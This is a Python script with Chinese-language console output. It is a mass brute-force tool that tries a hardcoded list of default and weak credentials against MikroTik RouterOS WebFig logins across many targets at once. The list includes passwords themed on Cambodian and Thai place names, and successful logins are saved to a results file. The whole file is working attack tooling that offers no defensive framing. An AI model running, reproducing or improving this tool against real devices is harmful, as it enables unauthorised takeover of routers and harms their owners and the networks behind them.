#!/usr/bin/env python3
import requests
import json
import concurrent.futures
from datetime import datetime
import urllib3
urllib3.disable_warnings()

class MassRouterOSAttack:
    def __init__(self, shodan_api_key=None):
        self.shodan_api_key = shodan_api_key
        self.results_file = "mass_attack_results.json"
        self.results = []
        
        self.credentials = [
            ("admin", ""), ("admin", "admin"), ("admin", "password"),
            ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
            ("admin", "Admin"), ("admin", "root"), ("admin", "P@ssw0rd"),
            ("root", ""), ("root", "admin"), ("root", "password"),
            ("root", "root"), ("root", "toor"), ("root", "1234"),
            ("user", ""), ("user", "user"), ("user", "password"),
            ("administrator", ""), ("administrator", "administrator"),
            ("admin", "cambodia"), ("admin", "thailand"),
            ("admin", "khmer"), ("admin", "bangkok"), ("admin", "phnompenh"),
        ]
    
    def attack_single_target(self, target):
        print("\n[*] 攻击目标: " + target)
        
        try:
            from routeros_webfig_brute import RouterOSWebFigBrute
            bruter = RouterOSWebFigBrute(target, timeout=8)
            result = bruter.brute_force(custom_creds=self.credentials)
            
            if result:
                success = {
                    "target": target,
                    "timestamp": datetime.now().isoformat(),
                }
                success.update(result)
                self.results.append(success)
                self.save_results()
                print("[+++ 成功!] " + target + " -> " + str(result))
                return success
        except Exception as e:
            print("[-] " + target + " 失败: " + str(e))
        
        return None
    
    def mass_attack(self, targets, workers=10):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print("\n[+] 开始批量攻击，共 %d 个目标" % len(targets))
        print("[+] 并发数: %d" % workers)
        print("[+] 时间: " + ts + "\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(self.attack_single_target, t) for t in targets]
            concurrent.futures.wait(futures)
        
        print("\n[+] 攻击完成！")
        print("[+] 成功: %d/%d" % (len(self.results), len(targets)))
        return self.results
    
    def save_results(self):
        with open(self.results_file, "w") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

def main():
    import argparse
    parser = argparse.ArgumentParser(description="MikroTik RouterOS 批量攻击")
    parser.add_argument("-f", "--file", help="从文件读取目标列表")
    parser.add_argument("-w", "--workers", type=int, default=10, help="并发数")
    
    args = parser.parse_args()
    
    attacker = MassRouterOSAttack()
    
    if args.file:
        with open(args.file) as f:
            targets = [line.strip() for line in f if line.strip()]
        attacker.mass_attack(targets, workers=args.workers)
    else:
        print("[-] 请提供 --file targets.txt")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        main()
    else:
        print("[+] MikroTik RouterOS 批量攻击工具")
